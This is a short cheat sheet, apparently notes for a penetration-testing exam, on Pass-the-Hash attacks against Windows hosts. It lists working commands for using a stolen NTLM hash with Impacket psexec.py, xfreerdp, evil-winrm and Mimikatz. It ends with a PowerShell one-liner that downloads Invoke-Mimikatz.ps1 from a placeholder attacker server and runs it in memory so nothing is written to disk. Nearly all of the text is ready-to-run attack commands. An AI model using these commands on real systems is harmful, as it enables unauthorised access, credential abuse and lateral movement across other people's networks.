# <h1 align="center" id="heading">PassTheHash</h1>
There are many ways that I can go about passing a NTLM hash to a remote system. I will outline a few of the most useful for the exam scenario. The first one that I can use is Impacket's psexec.py
```console
~/tools/impacket/examples/psexec.py <domain>/<user>@<target> -hashes :<ntlm hash>
```
I can also use xfreerdp to PTH if the user is authorized to use RDP. I will use the following command to accomplish this task:
```console
xfreerdp /u:<user> /pth:<ntlm hash> /v:<target> /d:<domain> /cert-ignore /dynamic-resolution +toggle-fullscreen
```
If the user has access to WIN-RM, I can use evil-winrm to PassTheHash and obtain a session on the target system. I can use the following command to accomplish this task:
```console
evil-winrm -u <user> -H <ntlm hash> -i <tgt ip>
```
This attack is also possible through the use of Mimikatz. I will first need to upload the file to the target and then I can run the following commands to PassTheHash and launch a PowerShell session in the context of the target user:
```powershell
.\mimikatz64.exe
```
```powershell
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash> /run:powershell.exe
```
I can also perform the same attack with Invoke-Mimikaz. This is advantageous because I do not have to write the file to disk. I can accomplish this task with the following command:
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("http://<attacker_server>/Invoke-Mimikatz.ps1");Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash> /run:powershell.exe"' 
```
